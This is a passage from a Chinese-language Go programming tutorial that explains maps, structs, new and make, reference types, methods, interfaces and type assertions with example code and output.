class="string">&quot;#e95a22&quot;</span>,    <span class="comment">// 最后一行需要加 ,</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(dict1, dict2)</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">dictNil is nil</span><br><span class="line">map[red:1] map[Orange:#e95a22 Red:#da1337]</span><br></pre></td></tr></table></figure>

<h4 id="4-2-映射的操作"><a href="#4-2-映射的操作" class="headerlink" title="4.2. 映射的操作"></a>4.2. 映射的操作</h4><ul>
<li><p>获取值：<code>value=map[key]</code>。通过双赋值检测某个键是否存在：<code>value, ok = map[key]</code>，若<code>key</code>在<code>map</code>中，<code>ok</code>为<code>true</code>；否则，<code>ok</code>为<code>false</code>；若<code>key</code>不在映射中，那么<code>value</code>是该映射元素类型的零值。</p>
</li>
<li><p>增加键值对：<code>map[key]=value</code></p>
</li>
<li><p>删除键值对，用<code>delete()</code>函数：<code>delete(map, key)</code></p>
</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">fmt.Println(dict1[<span class="string">&quot;red&quot;</span>])   <span class="comment">// 获取键值对</span></span><br><span class="line">dict1[<span class="string">&quot;blue&quot;</span>] = <span class="number">2</span>           <span class="comment">// 增加键值对</span></span><br><span class="line">fmt.Println(dict1)</span><br><span class="line"><span class="built_in">delete</span>(dict1, <span class="string">&quot;red&quot;</span>)        <span class="comment">// 删除键值对</span></span><br><span class="line">fmt.Println(dict1)</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">1</span><br><span class="line">map[red:1 blue:2]</span><br><span class="line">map[blue:2]</span><br></pre></td></tr></table></figure>

<h3 id="5-结构体-值-数据类型"><a href="#5-结构体-值-数据类型" class="headerlink" title="5. 结构体 值-数据类型"></a>5. 结构体 值-数据类型</h3><ul>
<li>结构体类型使用关键字<code>struct</code>进行定义，用<code>type</code>进行命名，如：<code>type user struct&#123;&#125;</code>。</li>
</ul>
<p>结构体定义：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> user <span class="keyword">struct</span> &#123;</span><br><span class="line">    name    <span class="type">string</span></span><br><span class="line">    email   <span class="type">string</span></span><br><span class="line">    age     <span class="type">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> admin <span class="keyword">struct</span> &#123;</span><br><span class="line">    person  user    <span class="comment">// 嵌套另一个结构体</span></span><br><span class="line">    level   <span class="type">int</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结构体使用：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> bill user       <span class="comment">// 初始化后，结构体中所有成员都会被赋零值</span></span><br><span class="line"><span class="comment">// 短变量声明</span></span><br><span class="line">lisa := user&#123;</span><br><span class="line">    name:   <span class="string">&quot;Lisa&quot;</span>,</span><br><span class="line">    email:  <span class="string">&quot;lisa@email.com&quot;</span>,</span><br><span class="line">    age:    <span class="number">19</span>,     <span class="comment">// 采用换行形式时最后一个也需要加 ,</span></span><br><span class="line">&#125;</span><br><span class="line">tom := user&#123;name:<span class="string">&quot;Tom&quot;</span>&#125; <span class="comment">// 单独声明某一个成员</span></span><br><span class="line">fmt.Println(bill, lisa, tom)</span><br><span class="line"></span><br><span class="line">ad := admin&#123;lisa, <span class="number">10</span>&#125;   <span class="comment">// 直接按照结构体成员顺序，传入对应的值</span></span><br><span class="line">adP := &amp;ad              <span class="comment">// 获取指向结构体的指针</span></span><br><span class="line">fmt.Println(ad, adP)</span><br><span class="line"></span><br><span class="line">fmt.Println(ad.person.name)  <span class="comment">// 结构体值访问内部成员</span></span><br><span class="line">fmt.Println(adP.person.name) <span class="comment">// 结构体指针访问内部成员</span></span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">&#123;  0&#125; &#123;Lisa lisa@email.com 19&#125; &#123;Tom  0&#125;</span><br><span class="line">&#123;&#123;Lisa lisa@email.com 19&#125; 10&#125; &amp;&#123;&#123;Lisa lisa@email.com 19&#125; 10&#125;</span><br><span class="line">Lisa</span><br><span class="line">Lisa</span><br></pre></td></tr></table></figure>

<h3 id="6-new-和-make"><a href="#6-new-和-make" class="headerlink" title="6. new 和 make"></a>6. new 和 make</h3><p>在go语言中有两个用于内存分配的函数：<code>new</code>和<code>make</code>。</p>
<h4 id="6-1-new"><a href="#6-1-new" class="headerlink" title="6.1. new"></a>6.1. new</h4><p>函数原型：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">new</span><span class="params">(Type)</span></span> *Type</span><br></pre></td></tr></table></figure>

<p>说明：</p>
<p>主要给<strong>值类型数据</strong>分配空间，并返回指向该数据空间的<strong>指针</strong>。这与<code>c</code>语言中<code>malloc</code>类似。但是，<code>new()</code>函数不能指定个数和大小，只能传入指定的数据类型(包括用户自定义的数据类型)。</p>
<p>示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// var i *int</span></span><br><span class="line"><span class="comment">// *i=10    错误，野指针</span></span><br><span class="line"><span class="keyword">var</span> i *<span class="type">int</span></span><br><span class="line">i = <span class="built_in">new</span>(<span class="type">int</span>)</span><br><span class="line">arrP := <span class="built_in">new</span>([<span class="number">5</span>]<span class="type">int</span>)     <span class="comment">// 分配长度为5的数组空间，并返回数组指针</span></span><br></pre></td></tr></table></figure>

<h4 id="6-2-make"><a href="#6-2-make" class="headerlink" title="6.2. make"></a>6.2. make</h4><p>函数原型：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">make</span><span class="params">(t Type, size ...IntegerType)</span></span> Type</span><br></pre></td></tr></table></figure>

<p>说明：</p>
<p>make也是用于内存分配的，但是和new不同，它只用于<code>chan</code>、<code>map</code>以及<code>slice</code>的内存创建，而且它返回的类型值，而不是他们的指针。同时，<code>make()</code>函数还能对这三个类型的相关属性进行初始化。</p>
<p>示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">slice := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">3</span>, <span class="number">5</span>)     <span class="comment">// 长度为3，容量为5，单位为int的slice</span></span><br><span class="line">dict := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">int</span>)   <span class="comment">// 键为string，值为int类型的map</span></span><br><span class="line">buffer := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, <span class="number">10</span>)<span class="comment">// 缓冲为10的字符串类型通道</span></span><br></pre></td></tr></table></figure>

<h3 id="7-浅谈引用类型"><a href="#7-浅谈引用类型" class="headerlink" title="7. 浅谈引用类型"></a>7. 浅谈引用类型</h3><p>在Go语言中，引用类型可以看作一个指针，它并不包含实际数据。比如，切片 <code>slice</code> 只是一个如下的类型：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Slice <span class="keyword">struct</span> &#123;</span><br><span class="line">    point Point <span class="comment">// 指向底层数据的指针</span></span><br><span class="line">    <span class="built_in">len</span> <span class="type">int</span>     <span class="comment">// 底层数据的长度</span></span><br><span class="line">    <span class="built_in">cap</span> <span class="type">int</span>     <span class="comment">// 底层数据的容量（最大长度）</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当引用类型作为函数参数时，你可以通过引用类型修改所指向的数据（退出函数后依然有效）。但是，你不可以修改引用类型本身（退出函数后修改无效）。</p>
<p>以 <code>map</code> 为例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mapAdd</span><span class="params">(m <span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    m[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;dounine&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">mapAdd2</span><span class="params">(m <span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    mp := <span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;&#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: <span class="string">&quot;dounine&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    m = mp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    data3 := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">    mapAdd(data3)</span><br><span class="line">    fmt.Println(<span class="string">&quot;type:&quot;</span>, reflect.TypeOf(data3), <span class="string">&quot;; value:&quot;</span>, reflect.ValueOf(data3))</span><br><span class="line"></span><br><span class="line">    data4 := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">interface</span>&#123;&#125;)</span><br><span class="line">    mapAdd2(data4)</span><br><span class="line">    fmt.Println(<span class="string">&quot;type:&quot;</span>, reflect.TypeOf(data4), <span class="string">&quot;; value:&quot;</span>, reflect.ValueOf(data4))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">type: map[string]interface &#123;&#125; ; value: map[name:dounine]</span><br><span class="line">type: map[string]interface &#123;&#125; ; value: map[]</span><br></pre></td></tr></table></figure>

<p>再以 <code>slice</code> 为例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sliceAdd</span><span class="params">(s []<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    s = <span class="built_in">append</span>(s, <span class="number">6</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sliceUpdate</span><span class="params">(s []<span class="type">int</span>)</span></span> &#123;</span><br><span class="line">    s[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    slice1 := []<span class="type">int</span>&#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>&#125;</span><br><span class="line">    sliceAdd(slice1)</span><br><span class="line">    fmt.Println(slice1)</span><br><span class="line"></span><br><span class="line">    sliceUpdate(slice1)</span><br><span class="line">    fmt.Println(slice1)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">[<span class="number">0</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span>]</span><br><span class="line">[<span class="number">1</span> <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">5</span>]</span><br></pre></td></tr></table></figure>

<p>原因是：<code>append</code> 函数会修改 <code>slice</code> 类型本身的 <code>len</code> 属性，退出函数后失效；而修改 <code>slice</code> 类型指向的数组的值，退出函数后依然有效。</p>
<h2 id="四、面向对象"><a href="#四、面向对象" class="headerlink" title="四、面向对象"></a>四、面向对象</h2><p>在<code>go</code>语言中是没有关键字<code>class</code>的，也就是说，<code>go</code>语言中没有类也没有继承。但，<code>go</code>却是一个面向对象的语言，那它究竟如何实现面向对象呢？</p>
<p>首先，<code>go</code>通过<strong>结构体</strong>的成员来定义类的属性，结构体名即类名；</p>
<p>其次，通过语法格式让函数与结构体关联，实现<strong>类方法</strong>；</p>
<p>然后，通过关键字<code>interface</code>与结构体结合，实现<strong>接口和多态</strong>；</p>
<p>接着，通过结构体<strong>实名内嵌</strong>的形式，来实现对象内嵌另一个对象的<code>has-a</code>模式；</p>
<p>最后，通过结构体<strong>匿名域内嵌</strong>的形式，来实现“继承”，即<code>is-a</code>模式。</p>
<p>各功能的具体实现，下文一一讲解。</p>
<!--more-->

<h3 id="1-类方法"><a href="#1-类方法" class="headerlink" title="1. 类方法"></a>1. 类方法</h3><h4 id="1-1-定义"><a href="#1-1-定义" class="headerlink" title="1.1. 定义"></a>1.1. 定义</h4><p>格式：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用户类型</span></span><br><span class="line"><span class="keyword">type</span> user <span class="keyword">struct</span> &#123;</span><br><span class="line">    name  <span class="type">string</span></span><br><span class="line">    email <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// notify 方法，以值为接收者</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u user)</span></span> notify() &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;Sending User Email To %s&lt;%s&gt;\n&quot;</span>,</span><br><span class="line">        u.name,</span><br><span class="line">        u.email)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// changeEmail 方法，以指针为接收者</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(u *user)</span></span> changeEmail(email <span class="type">string</span>) &#123;</span><br><span class="line">    u.email = email</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说明：</p>
<ul>
<li><p>一个类型的方法的声明，必须跟类型在同一个包内。</p>
</li>
<li><p>方法的声明与函数类似，不同的是，需要在<code>func</code>与方法名之间加上<strong>接收者</strong>参数，指明方法所从属的类型。接收者有两种：<strong>值接收者</strong> 和 <strong>指针接收者</strong>。</p>
</li>
</ul>
<h4 id="1-2-调用类方法"><a href="#1-2-调用类方法" class="headerlink" title="1.2. 调用类方法"></a>1.2. 调用类方法</h4><p>调用类型的方法：**<code>&lt;类型值/指针&gt;.&lt;方法&gt;</code><strong>，如：<code>boss.notify()</code>。</strong>不管是值类型，还是指向类型的指针，都使用这种格式**。</p>
<p>示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 值类型</span></span><br><span class="line">boss := user&#123;</span><br><span class="line">    name: <span class="string">&quot;aaaaa&quot;</span>,</span><br><span class="line">    email: <span class="string">&quot;123456&quot;</span>,</span><br><span class="line">    age: <span class="number">20</span>,</span><br><span class="line">&#125;</span><br><span class="line">boss.notify()</span><br><span class="line">boss.changeEmail(<span class="string">&quot;2222&quot;</span>)    <span class="comment">// go语言隐式转换，(&amp;boss).changeEmail()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 指针类型</span></span><br><span class="line">bossP := &amp;boss</span><br><span class="line">bossP.notify()              <span class="comment">// 隐式转换，(*bossP).notify()</span></span><br><span class="line">bossP.changeEmail(<span class="string">&quot;1111&quot;</span>)</span><br></pre></td></tr></table></figure>

<h4 id="1-3-指针接收者和值接收者"><a href="#1-3-指针接收者和值接收者" class="headerlink" title="1.3. 指针接收者和值接收者"></a>1.3. 指针接收者和值接收者</h4><p><strong>类型的值</strong> 使用 <strong>指针接收者声明的方法</strong>，和 <strong>类型的指针</strong>使用 <strong>值接收者声明的方法</strong>时，go语言都会进行<strong>隐式转换</strong>。所以，不管是以什么接收者声明的方法，值类型和指针类型都能调用。</p>
<p>示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">boss := user&#123;</span><br><span class="line">    name: <span class="string">&quot;aaaaa&quot;</span>,</span><br><span class="line">    email: <span class="string">&quot;123456&quot;</span>,</span><br><span class="line">    age: <span class="number">20</span>,</span><br><span class="line">&#125;</span><br><span class="line">boss.notify()</span><br><span class="line">boss.changeEmail(<span class="string">&quot;2222&quot;</span>)    <span class="comment">// go语言隐式转换，(&amp;boss).changeEmail()</span></span><br><span class="line">fmt.Println(boss)</span><br><span class="line"></span><br><span class="line">bossP := &amp;boss</span><br><span class="line">bossP.notify()              <span class="comment">// 隐式转换，(*bossP).notify()</span></span><br><span class="line">bossP.changeEmail(<span class="string">&quot;1111&quot;</span>)</span><br><span class="line">fmt.Println(bossP)</span><br></pre></td></tr></table></figure>

<p><strong>值接收者</strong> 和 <strong>指针接收者</strong> 的区别：</p>
<ul>
<li>值接收者得到类型的<strong>副本</strong>，修改副本值不会对原本值起作用；</li>
<li>指针接收者得到指向类型值的指针，所以，在指针接收者的方法中修改类型数据，<strong>会影响到原本的值</strong>。</li>
</ul>
<p>示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">    <span class="string">&quot;math&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Vertex <span class="keyword">struct</span> &#123;</span><br><span class="line">    X, Y <span class="type">float64</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 值接收者</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v Vertex)</span></span> Scale1(f <span class="type">float64</span>) &#123;</span><br><span class="line">    v.X = v.X * f</span><br><span class="line">    v.Y = v.Y * f</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指针接收者</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v *Vertex)</span></span> Scale2(f <span class="type">float64</span>) &#123;</span><br><span class="line">    v.X = v.X * f</span><br><span class="line">    v.Y = v.Y * f</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    v := Vertex&#123;<span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">    fmt.Println(v)      <span class="comment">// 输出 &#123;3,4&#125;</span></span><br><span class="line">    v.Scale1(<span class="number">10</span>)</span><br><span class="line">    fmt.Println(v)      <span class="comment">// 输出 &#123;3,4&#125;</span></span><br><span class="line">    v.Scale2(<span class="number">10</span>)</span><br><span class="line">    fmt.Println(v)      <span class="comment">// 输出 &#123;30,40&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-接口-引用-数据类型"><a href="#2-接口-引用-数据类型" class="headerlink" title="2. 接口 引用-数据类型"></a>2. 接口 引用-数据类型</h3><h4 id="2-1-声明"><a href="#2-1-声明" class="headerlink" title="2.1. 声明"></a>2.1. 声明</h4><p>接口是<strong>一系列方法的集合</strong>。它的格式如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> &lt;接口名&gt; <span class="keyword">interface</span> &#123;</span><br><span class="line">    方法<span class="number">1</span>名(方法参数) 方法返回值</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时，也可以<strong>组合(嵌入)其它接口形成新接口</strong>：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> &lt;接口名&gt; <span class="keyword">interface</span> &#123;</span><br><span class="line">    接口名<span class="number">1</span></span><br><span class="line">    接口名<span class="number">2</span></span><br><span class="line">    ...</span><br><span class="line">    方法<span class="number">1</span>名(方法参数) 方法返回值</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>嵌入进来的接口，相当于把它的方法都复制到新接口中。</p>
<h4 id="2-2-实现接口"><a href="#2-2-实现接口" class="headerlink" title="2.2. 实现接口"></a>2.2. 实现接口</h4><p>如果想要某个类型实现某个接口，只需要<strong>将接口中所有方法实现为类方法</strong>即可。示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> I <span class="keyword">interface</span> &#123;</span><br><span class="line">    M()</span><br><span class="line">    N()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span> &#123;</span><br><span class="line">    S <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以下两个方法意味着： type T implements the interface I</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t T)</span></span> M() &#123;</span><br><span class="line">    fmt.Println(t.S)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t T)</span></span> N() &#123;</span><br><span class="line">    fmt.Println(t.S)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-3-使用接口"><a href="#2-3-使用接口" class="headerlink" title="2.3. 使用接口"></a>2.3. 使用接口</h4><p>如果某个类型实现了某个接口类型的所有方法，那么就可以将该<strong>类型的值或指针</strong>赋给这个<strong>接口类型的值</strong>。</p>
<p><strong>但要注意</strong>：</p>
<ul>
<li><strong>值类型 和 指针类型 能使用 值接收者 实现的方法；</strong></li>
<li><strong>但是，值类型 不能使用 指针接收者 实现的方法，指针类型 才能使用。</strong></li>
</ul>
<p>示例如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 接口 I</span></span><br><span class="line"><span class="keyword">type</span> I <span class="keyword">interface</span> &#123;</span><br><span class="line">    M()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类型 T</span></span><br><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span> &#123;</span><br><span class="line">    S <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 值接收者 实现的方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t T)</span></span> M() &#123;</span><br><span class="line">    fmt.Println(t.S)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 值类型 使用 值接收者 实现的方法</span></span><br><span class="line">    <span class="keyword">var</span> i I = T&#123;<span class="string">&quot;hello&quot;</span>&#125;</span><br><span class="line">    i.M()</span><br><span class="line">    <span class="comment">// 指针类型 使用 值接收者 实现的方法</span></span><br><span class="line">    <span class="keyword">var</span> i I = &amp;T&#123;<span class="string">&quot;hello&quot;</span>&#125;</span><br><span class="line">    i.M() <span class="comment">// 隐式转换：(*i).M()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 接口 I</span></span><br><span class="line"><span class="keyword">type</span> I <span class="keyword">interface</span> &#123;</span><br><span class="line">    M()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类型 T</span></span><br><span class="line"><span class="keyword">type</span> T <span class="keyword">struct</span> &#123;</span><br><span class="line">    S <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指针接收者 实现的方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(t *T)</span></span> M() &#123;</span><br><span class="line">    fmt.Println(t.S)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// 值类型 不能使用 指针接收者 实现的方法</span></span><br><span class="line">    <span class="comment">// Error: cannot use T literal (type T) as type I in assignment:</span></span><br><span class="line">    <span class="comment">// T does not implement I (M method has pointer receiver)</span></span><br><span class="line">    <span class="keyword">var</span> i1 I = T&#123;<span class="string">&quot;hello&quot;</span>&#125;</span><br><span class="line">    i1.M()</span><br><span class="line">    <span class="comment">// 指针类型 才能使用 指针接收者 实现的方法</span></span><br><span class="line">    <span class="keyword">var</span> i2 I = &amp;T&#123;<span class="string">&quot;hello&quot;</span>&#125;</span><br><span class="line">    i2.M()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，我们通常定义类型指针来操作类型。</p>
<h4 id="2-4-nil接口"><a href="#2-4-nil接口" class="headerlink" title="2.4. nil接口"></a>2.4. nil接口</h4><p>如果没有为接口赋值，而调用接口中的方法，那将会报错，因为接口值为<code>nil</code>：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> I <span class="keyword">interface</span> &#123;</span><br><span class="line">    M()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> i I</span><br><span class="line">    <span class="comment">// panic: runtime error: invalid memory address or nil pointer dereference</span></span><br><span class="line">    i.M()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-5-空接口-泛型"><a href="#2-5-空接口-泛型" class="headerlink" title="2.5. 空接口 - 泛型"></a>2.5. 空接口 - 泛型</h4><p>空接口相当于C++中的<strong>泛型</strong>。格式如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>使用示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> i <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">    describe(i) <span class="comment">// 输出：(&lt;nil&gt;, &lt;nil&gt;)</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">42</span></span><br><span class="line">    describe(i) <span class="comment">// 输出：(42, int)</span></span><br><span class="line"></span><br><span class="line">    i = <span class="string">&quot;hello&quot;</span></span><br><span class="line">    describe(i) <span class="comment">// 输出：(hello, string)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">describe</span><span class="params">(i <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    fmt.Printf(<span class="string">&quot;(%v, %T)\n&quot;</span>, i, i) <span class="comment">// %v:变量的值，%T:变量的类型</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-6-类型断言与空接口-泛型"><a href="#2-6-类型断言与空接口-泛型" class="headerlink" title="2.6. 类型断言与空接口(泛型)"></a>2.6. 类型断言与空接口(泛型)</h4><p>类型断言可以判断变量是否为该类型。格式如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">t := i.(T)</span><br></pre></td></tr></table></figure>

<p>若不是，将报错中断程序。如果不想中断，则使用如下格式：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">t, ok := i.(T)</span><br></pre></td></tr></table></figure>

<p>若不是，则<code>ok</code>值为<code>false</code>。</p>
<p>使用示例：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> i <span class="keyword">interface</span>&#123;&#125; = <span class="string">&quot;hello&quot;</span></span><br><span class="line"></span><br><span class="line">    s := i.(<span class="type">string</span>)</span><br><span class="line">    fmt.Println(s)</span><br><span class="line"></span><br><span class="line">    s, ok := i.(<span class="type">string</span>)</span><br><span class="line">    fmt.Println(s, ok)</span><br><span class="line"></span><br><span class="line">    f, ok := i.(<span class="type">float64</span>)</span><br><span class="line">    fmt.Println(f, ok)</span><br><span class="line"></span><br><span class="line">    f = i.(<span class="type">float64</span>) <span class="comment">// panic: interface conversion: interface &#123;&#125; is string, not float64</span></span><br><span class="line">    fmt.Println(f)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现一个类型判断函数：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">do</span><span class="params">(i <span class="keyword">interface</span>&#123;&#125;)</span></span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> v := i.(<span class="keyword">type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="type">int</span>:</span><br><span class="line">            fmt.Printf(<span class="string">&quot;Twice %v is %v\n&quot;</span>, v, v*<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">case</span> <span class="type">string</span>:</span><br><span class="line">            fmt.Printf(<span class="string">&quot;%q is %v bytes long\n&quot;</span>, v, <span class="built_in">len</span>(v))</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            fmt.Printf(<span class="string">&quot;I don&#x27;t know about type %T!\n&quot;</span>, v)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-7-自定义输出格式-Stringers-接口"><a href="#2-7-自定义输出格式-Stringers-接口" class="headerlink" title="2.7. 自定义输出格式 - Stringers 接口"></a>2.7. 自定义输出格式 - Stringers 接口</h4><p><code>Stringers</code>接口定义如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> Stringer <span class="keyword">interface</span> &#123;</span><br><span class="line">    String() <span class="type">string</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它允许用户<strong>自定义变量打印格式</strong>。示例如下：</p>
